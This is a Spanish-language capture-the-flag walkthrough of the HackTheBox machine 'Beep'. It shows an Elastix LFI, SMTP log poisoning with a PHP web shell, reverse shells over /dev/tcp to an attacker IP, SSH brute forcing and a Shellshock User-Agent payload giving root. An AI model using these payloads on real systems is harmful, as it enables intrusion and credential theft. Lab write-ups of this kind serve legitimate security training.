---
title: HackTheBox - Beep
draft: false
author: "wixnic"
authorLink: ""
description: "This is my description."
license: ""
images: []
date: 2021-12-23 11:33:00 +0800
categories: [HackTheBox Nix]
tags: [ssh, smtp, freepbx, elastix, smtp-log-poisoning, lfi, rce, ssh-algorithms, privilege-escalation-nmap, privilege-escalation-chmod, autopwn, bash, wget, curl, python]
featuredImage: "/images/thumbnails/htb-beep.png"
featuredImagePreview: "/images/thumbnails/htb-beep.png"

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

code:
  copy: true
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...
---

# Set up

Primero creo un directorio de trabajo:

```shell
❯ mkdir Beep
❯ cd !$
cd Beep
```

Luego uso la función `mk` que he definido en mi archivo de configuración de zsh, que uso para crear mis directorios de trabajo:

```shell
❯ which mk
mk () {
        mkdir {scans,content,loot,exploits,scripts,report}
}
❯ mk
❯ ls
 content   exploits   loot   report   scans   scripts
```

# Recon

## OS Fingerprinting

Esta es la función que he definido en el archivo de configuración de zsh `.zshrc` para identificar el sistema operativo basado en el valor TTL:

```shell
❯ which os
os () {
        ttl="$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' '  -f 1 | tr -d '\n')"
        if (( $ttl <= 64 ))
        then
                echo 'OS: Unix/Linux'
        elif (( $ttl <= 128 ))
        then
                echo 'OS: Windows'
        else
                echo 'OS: Not detected'
        fi
}
```

Podemos identificar el sistema operativo ejecutando el siguiente comando:

```shell
❯ os 10.10.10.7
OS: Unix/Linux
```

## TCP SYN Scan

Entonces podemos intentar ejecutar un `TCP SYN scan`, no confundirlo con un `TCP connect scan`, nmap utiliza un TCP SYN Scan `-sS` por defecto, por lo que no es necesario especificarlo. 

Puedes leer la página de manual aquí: [nmap](https://nmap.org/book/man-port-scanning-techniques.html)

```shell
❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.7
[sudo] password for kali:
Sorry, try again.
[sudo] password for kali:
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 15:48 EST
Nmap scan report for 10.10.10.7
Host is up (0.25s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
878/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 11.31 seconds
```

## Service Fingerprinting

Esta es otra función que tengo en mi zsh para extraer puertos TCP:

```shell
❯ which xp
xp () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)"
	echo "[+] Open ports: $ports" >> xp.tmp
	printf $ports | xclip -sel clip
	echo "[+] Ports copied to clipboard" >> xp.tmp
	/usr/bin/bat xp.tmp
	rm xp.tmp
}
```

Luego extraigo los puertos TCP:

```shell
❯ xp scans/nmap-tcpall
───────┬───────────────────────────────────────────────────────────────────────────────
       │ File: xp.tmp
───────┼───────────────────────────────────────────────────────────────────────────────
   1   │ [+] Open ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,
       │ 10000
   2   │ [+] Ports copied to clipboard
───────┴───────────────────────────────────────────────────────────────────────────────
```

Nmap tiene algunos scripts que podemos utilizar para recopilar información sobre los servicios:

```shell
find / -name '*.nse' -type f 2>/dev/null
```

Ahora me gusta enumerar los servicios usando los de scripts nmap y ver el tiempo de ejecución con `-vvv`:

```shell
sudo nmap -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 -n -Pn --min-rate 5000 -sCV -oN scans/nmap-tcpscripts 10.10.10.7 -vvv
```

Una vez que termina, podemos leer el archivo de nmap:

```shell
cat scans/nmap-tcpscripts.nmap 
```

# Web - TCP 80 -> TCP 443

## Response Headers Enumeration

Cuando enumeramos las cabeceras (headers) de respuesta podemos ver un 302 encontrado:

```shell
❯ curl -I http://10.10.10.7
HTTP/1.1 302 Found
Date: Wed, 22 Dec 2021 22:44:21 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://10.10.10.7/
Connection: close
Content-Type: text/html; charset=iso-8859-1
```

Sigamos la redirección con `-L`:

```shell
❯ curl -I http://10.10.10.7 -L
HTTP/1.1 302 Found
Date: Wed, 22 Dec 2021 22:44:29 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://10.10.10.7/
Connection: close
Content-Type: text/html; charset=iso-8859-1

curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

Podemos ver un problema dell certificado SSL, así que vamos a ignorarlo con `-k`:

```shell
❯ curl -Ik http://10.10.10.7 -L
HTTP/1.1 302 Found
Date: Wed, 22 Dec 2021 22:46:05 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://10.10.10.7/
Connection: close
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Wed, 22 Dec 2021 22:46:06 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Set-Cookie: elastixSession=7mh9441083miqlnc9f5t7iff25; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
```

Alternativamente, podemos hacer esto de una sola vez con whatweb:

```shell
❯ whatweb -a 3 -v 10.10.10.7
WhatWeb report for http://10.10.10.7
Status    : 302 Found
Title     : 302 Found
IP        : 10.10.10.7
Country   : RESERVED, ZZ

Summary   : HTTPServer[CentOS][Apache/2.2.3 (CentOS)], Apache[2.2.3], RedirectLocation[https://10.10.10.7/]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and
        maintain an open-source HTTP server for modern operating
        systems including UNIX and Windows NT. The goal of this
        project is to provide a secure, efficient and extensible
        server that provides HTTP services in sync with the current
        HTTP standards.

        Version      : 2.2.3 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        OS           : CentOS
        String       : Apache/2.2.3 (CentOS) (from server string)

[ RedirectLocation ]
        HTTP Server string location. used with http-status 301 and
        302

        String       : https://10.10.10.7/ (from location)

HTTP Headers:
        HTTP/1.1 302 Found
        Date: Wed, 22 Dec 2021 23:02:27 GMT
        Server: Apache/2.2.3 (CentOS)
        Location: https://10.10.10.7/
        Content-Length: 278
        Connection: close
        Content-Type: text/html; charset=iso-8859-1

WhatWeb report for https://10.10.10.7/
Status    : 200 OK
Title     : Elastix - Login page
IP        : 10.10.10.7
Country   : RESERVED, ZZ

Summary   : X-Powered-By[PHP/5.1.6], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], Script[text/javascript], Apache[2.2.3], PasswordField[input_pass], Cookies[elastixSession], PHP[5,5.1,5.1.6]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and
        maintain an open-source HTTP server for modern operating
        systems including UNIX and Windows NT. The goal of this
        project is to provide a secure, efficient and extensible
        server that provides HTTP services in sync with the current
        HTTP standards.

        Version      : 2.2.3 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The
        values are not returned to save on space.

        String       : elastixSession

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        OS           : CentOS
        String       : Apache/2.2.3 (CentOS) (from server string)

[ PHP ]
        PHP is a widely-used general-purpose scripting language
        that is especially suited for Web development and can be
        embedded into HTML. This plugin identifies PHP errors,
        modules and versions and extracts the local file path and
        username if present.

        Version      : 5.1.6
        Version      : 5
        Version      : 5.1
        Google Dorks: (2)
        Website     : http://www.php.net/

[ PasswordField ]
        find password fields

        String       : input_pass (from field name)

[ Script ]
        This plugin detects instances of script HTML elements and
        returns the script language/type.

        String       : text/javascript

[ X-Powered-By ]
        X-Powered-By HTTP header

        String       : PHP/5.1.6 (from x-powered-by string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Wed, 22 Dec 2021 23:02:31 GMT
        Server: Apache/2.2.3 (CentOS)
        X-Powered-By: PHP/5.1.6
        Set-Cookie: elastixSession=jqms410lvrkucq18tlgq3di3i7; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
        Pragma: no-cache
        Content-Length: 1785
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

Cuando visitamos la web en el puerto 80 nos redirige al puerto 443 / HTTPS.

```shell
❯ curl -sk https://10.10.10.7 | html2text

[elastix logo]
Username:
[input_user          ]
Password:
[********************]
[Submit]
Elastix is licensed under GPL by PaloSanto_Solutions. 2006 - 2021.
```

En el puerto 443 podemos ver una página de inicio de sesión de Elastix:

Elastix es un private branch exchange (PBX) software. Una PBX controla los dispositivos VoIP dentro de una red corporativa.

## Directory & Files Fuzzing

Las listas de palabras más comunes para el fuzzing son:
- common.txt
- big.txt
- directory-list.2.3-medium.txt

Voy a eliminar las líneas que empiezan con un comentario de la lista de palabras `directory-list.2.3-medium.txt` y crear una nueva lista de palabras sin ellas:

```shell
catn /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -v '^#' > directory-list-2.3-medium.txt
```

Como sabemos que este sitio utiliza PHP podemos añadir una lista de extensiones:

```shell
❯ ffuf -w directory-list-2.3-medium.txt -u https://10.10.10.7/FUZZ -e .php,.txt -t 150

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.7/FUZZ
 :: Wordlist         : FUZZ: directory-list-2.3-medium.txt
 :: Extensions       : .php .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 310, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 1785, Words: 103, Lines: 35]
                        [Status: 200, Size: 1785, Words: 103, Lines: 35]
help                    [Status: 301, Size: 308, Words: 20, Lines: 10]
register.php            [Status: 200, Size: 1785, Words: 103, Lines: 35]
themes                  [Status: 301, Size: 310, Words: 20, Lines: 10]
modules                 [Status: 301, Size: 311, Words: 20, Lines: 10]
mail                    [Status: 301, Size: 308, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 309, Words: 20, Lines: 10]
static                  [Status: 301, Size: 310, Words: 20, Lines: 10]
lang                    [Status: 301, Size: 308, Words: 20, Lines: 10]
config.php              [Status: 200, Size: 1785, Words: 103, Lines: 35]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3]
var                     [Status: 301, Size: 307, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 309, Words: 20, Lines: 10]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

### /admin

Al ir a /admin, pide un inicio de sesión con autenticación básica HTTP:

![admin](/images/posts/admin.png)

Si intentamos admin:admin no entra, sin embargo, si le damos a cancelar nos redirige a /admin/config.php:

![HTTP Basic Auth Redirect](/images/posts/http-basic-auth-cancel-redirect.png)

## LFI

Si usamos searchsploit para encontrar exploits en Elastix:

```shell
❯ searchsploit elastix
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilit | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulner | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion     | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                    | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                   | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Executi | php/webapps/18650.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Podemos ver una lista de exploits, para acotar esto podemos usar la pista de la máquina, que dice LFI, o podemos leer cada exploit y confirmar si la vulnerabilidad existe, en este caso si leemos el exploit el siguiente exploit de perl:

```shell
❯ searchsploit -x php/webapps/37637.pl
```

Hay una línea que podemos usar para confirmar si este archivo existe:

```perl
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Podemos usar curl para confirmar que este archivo existe:

```shell
❯ curl -Isk https://10.10.10.7/vtigercrm/graph.php
HTTP/1.1 200 OK
Date: Wed, 22 Dec 2021 23:12:58 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Connection: close
Content-Type: text/html; charset=UTF-8
```

Podemos confirmar el POC con curl:

```shell
❯ curl -vsk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"
*   Trying 10.10.10.7:443...
* Connected to 10.10.10.7 (10.10.10.7) port 443 (#0)
<..SNIP..>
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
<..SNIP..>
```

Debido a que no hay filtro de '../' y puedo pasar el porcentaje %00 para truncar el texto, y la opción current_language lleva a un archivo, podemos hacer LFI. El porcentaje `%00` indica que PHP está añadiendo la extensión `.php` a la entrada antes de incluirla. Al agregar el porcentaje `%00` a una instancia de PHP obsoleta truncaría la cadena, haciendo que la extensión `.php` sea ignorado.

Parece que tenemos algunas contraseñas de la salida anterior, podemos filtrar esto:

```shell
❯ curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -E 'PASS=|PASSWORD='
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

Guárdalo en un archivo:

```shell
curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -E 'PASS=|PASSWORD=' | cut -d '=' -f 2 | uniq -u >> passwords.txt
```

Ahora tenemos una lista de contraseñas:
- amp109
- amp111
- jEhdIekWmdjE
- passw0rd

Ya que tenemos LFI, podemos intentar enumerar los usuarios también, vamos a leer el archivo `/etc/passwd`:

```shell
❯ curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action"
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

Filtremos los nombres de usuario y guardémoslos en un archivo:

```shell
❯ curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" | grep bash | cut -d ':' -f 1 > users.txt
❯ cat users.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root
   2   │ mysql
   3   │ cyrus
   4   │ asterisk
   5   │ spamfilter
   6   │ fanis
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

# SMTP - TCP 25

Podemos utilizar telnet para conectarnos a SMTP:

```shell
❯ telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix # < wait for this
```

Alternativamente, podemos utilizar nc:

```shell
❯ nc -nv 10.10.10.7 25
(UNKNOWN) [10.10.10.7] 25 (smtp) open
220 beep.localdomain ESMTP Postfix # < wait for this
```

## SMTP User Enumeration

Podemos validar que los usuarios que tienen un `email` en SMTP:

```shell
❯ telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix
HELO
501 Syntax: HELO hostname
HELO wixnic
250 beep.localdomain
VRFY root@localhost
252 2.0.0 root@localhost
VRFY root
252 2.0.0 root
```

## SMTP Log Poisoning through LFI to RCE [Path #1]

Ya que el SMTP está abierto podemos intentar enviar correos electrónicos con código malicioso, este código malicioso se almacenará en los archivos de registro bajo `/var/mail/[nombre de usuario]`, ya tenemos nombres de usuario válidos así que podemos intentar hacer Log Poisoning vía SMTP y acceder al registro vía LFI.

Utilicemos telnet para enviar un correo electrónico:

```shell
telnet 10.10.10.7 25

HELO wixnic
MAIL FROM:<wixnic@helo.htb>
RCPT TO:<asterisk@localhost>
DATA
Message from telnet PHP code: <?php system($_REQUEST["telnet_cmd"]); ?>
.
QUIT
```

Así se ve la salida de cada entrada:

```shell
❯ telnet 10.10.10.7 25

Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix
HELO wixnic
250 beep.localdomain
MAIL FROM:<wixnic@helo.htb>
250 2.1.0 Ok
RCPT TO:<asterisk@localhost>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Message from telnet PHP code: <?php system($_REQUEST["telnet_cmd"]); ?>
.
250 2.0.0 Ok: queued as 37235D92FD
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

Ahora envía la petición curl con el parámetro `&telnet_cmd` con el argumento como comando `id`:

```shell
curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action&telnet_cmd=id"
```

Podemos enviar un correo electrónico con los intercambios:

```shell
❯ swaks --to asterisk@localhost --from wixnic@helo.htb --header "Subject: Shell" --body 'PHP code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
=== Trying 10.10.10.7:25...
=== Connected to 10.10.10.7.
<-  220 beep.localdomain ESMTP Postfix
 -> EHLO kali
<-  250-beep.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 DSN
 -> MAIL FROM:<wixnic@helo.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<asterisk@localhost>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Wed, 22 Dec 2021 19:07:02 -0500
 -> To: asterisk@localhost
 -> From: wixnic@helo.htb
 -> Subject: Shell
 -> Message-Id: <20211222190702.277580@kali>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> PHP code: <?php system($_REQUEST["cmd"]); ?>
 ->
 ->
 -> .
<-  250 2.0.0 Ok: queued as D7063D92FD
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

Ahora podemos leer ese archivo con la LFI en y añadir `&cmd=id` al final de la URL, para ejecutar comandos del sistema:

```shell
curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action&cmd=id"
```

En lugar de `id`, vamos añadir una shell inversa, también voy a codificar los datos, en este caso el código de la shell inversa con `--data-urlencode`:

```shell
❯ curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action" --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.16.3/443 0>&1"
```

Ahora recibimos una shell:

```shell
❯ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 59168
bash: no job control in this shell
bash-3.2$ id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
bash-3.2$ whoami
asterisk
```

# SSH - TCP 22 [Path #2]

Podemos intentar la fuerza bruta de SSH:

```shell
❯ crackmapexec ssh 10.10.10.7 -u htb/box/Beep/users.txt  -p passwords.txt
SSH         10.10.10.7      22     10.10.10.7       [*] SSH-2.0-OpenSSH_4.3
SSH         10.10.10.7      22     10.10.10.7       [-] root:amp109 Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [+] root:jEhdIekWmdjE (Pwn3d!)
```

También podemos utilizar la hidra:

```shell
❯ hydra -L htb/box/Beep/users.txt -P passwords.txt -s 22 ssh://10.10.10.7 -v -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 18:37:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (l:6/p:4), ~6 tries per task
[DATA] attacking ssh://10.10.10.7:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://root@10.10.10.7:22
[INFO] Successful, password authentication is supported by ssh://10.10.10.7:22
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
```

Alternativamente, el patator también es útil:

```shell
❯ patator ssh_login host=10.10.10.7 port=22 user=FILE0 password=FILE1 0=htb/box/Beep/users.txt 1=passwords.txt
18:39:49 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2021-12-22 18:39 EST
18:39:49 patator    INFO -
18:39:49 patator    INFO - code  size    time | candidate                          |   num | mesg
18:39:49 patator    INFO - -----------------------------------------------------------------------------
18:40:01 patator    INFO - 0     19    10.516 | root:jEhdIekWmdjE                  |     2 | SSH-2.0-OpenSSH_4.3
```

Ncrack también es una opción:

```shell
❯ ncrack -p 22 -U htb/box/Beep/users.txt -P passwords.txt 10.10.10.7 -T 5

Starting Ncrack 0.7 ( http://ncrack.org ) at 2021-12-22 18:41 EST

Discovered credentials for ssh on 10.10.10.7 22/tcp:
10.10.10.7 22/tcp ssh: 'root' 'jEhdIekWmdjE'

Ncrack done: 1 service scanned in 42.01 seconds.

Ncrack finished.
```

Oh, medusa también lo es:

```shell
❯ medusa -h 10.10.10.7 -U htb/box/Beep/users.txt -P passwords.txt -M ssh 10.10.10.7
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.10.10.7 (1 of 1, 0 complete) User: root (1 of 6, 0 complete) Password: amp109 (1 of 4 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.10.7 (1 of 1, 0 complete) User: root (1 of 6, 0 complete) Password: jEhdIekWmdjE (2 of 4 complete)
ACCOUNT FOUND: [ssh] Host: 10.10.10.7 User: root Password: jEhdIekWmdjE [SUCCESS]
```

Vale, ya está bien... ¡para!

Una vez dicho esto, sólo tienes que entrar en ssh con esas credenciales válidas:

> Username: root
> Pasword: jEhdIekWmdjE

Pero oh no... podrías tener un problema de algoritmo de intercambio de claves:

```shell
❯ ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

Puedes solucionarlo fácilmente, especificando uno de los algoritmos que ofrecen e iniciando sesión como root:

```shell
❯ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password:
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b9:1d:bb brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.7/24 brd 10.10.10.255 scope global eth0
[root@beep ~]#
```

# Webmin - TCP 10000

Webmin está alojado en el puerto TCP 10000 con SSL:

```shell
❯ curl -Isk "http://10.10.10.7:10000/"
HTTP/1.0 200 Bad Request
Server: MiniServ/1.570
Date: Wed, 22 Dec 2021 23:33:57 GMT
Content-type: text/html; Charset=iso-8859-1
Connection: close

❯ curl -Isk "https://10.10.10.7:10000/"
HTTP/1.0 200 Document follows
Date: Wed, 22 Dec 2021 23:34:04 GMT
Server: MiniServ/1.570
Connection: close
Set-Cookie: testing=1; path=/; secure
pragma: no-cache
Expires: Thu, 1 Jan 1970 00:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Content-type: text/html; Charset=iso-8859-1
```

Webmin es una interfaz web para gestionar sistemas Unix.

## Shellshock [Path #3]

Cada vez que hay CGI o un Script en una aplicación web, es bueno intentar probar ShellShock. Para probarlo, abriré burpsuite y enviaré la petición de inicio de sesión a Repeater y reemplazaré la cabecera User-Agent con la cadena del exploit Shellshock ``() { :; };[cmd]``, comenzando con un sleep de 5 segundos:

```http
User-Agent: () { :; };sleep 5
```

Si recibimos una respuesta en 5 segundos entonces funciona y eso confirmará que es vulnerable a shellshock. Vamos a intentar hacer un ping a nosotros mismos.

Configurar un oyente/listener en ICMP:

```shell
sudo tcpdump -ni tun0 icmp
```

Crea una única petición de ping con `-c 1`:

```http
User-Agent: () { :; };ping -c 1 10.10.16.3
```

Y recibimos una conexión:

```shell
❯ sudo tcpdump -ni tun0 icmp
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:56:11.688169 IP 10.10.10.7 > 10.10.16.3: ICMP echo request, id 20511, seq 1, length 64
18:56:11.688182 IP 10.10.16.3 > 10.10.10.7: ICMP echo reply, id 20511, seq 1, length 64
```

Establezcamos una shell inversa:

```shell
User-Agent: () { :; };bash -i >& /dev/tcp/10.10.16.3/443 0>&1
```

Recibimos una conexión como root:

```shell
❯ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 59290
bash: no job control in this shell
[root@beep webmin]# id
uid=0(root) gid=0(root)
[root@beep webmin]# whoami
root
```

## Webmin Command [Path #4]

 Podemos acceder a webmin con las credenciales root:jEhdIekWmdjE. 
 
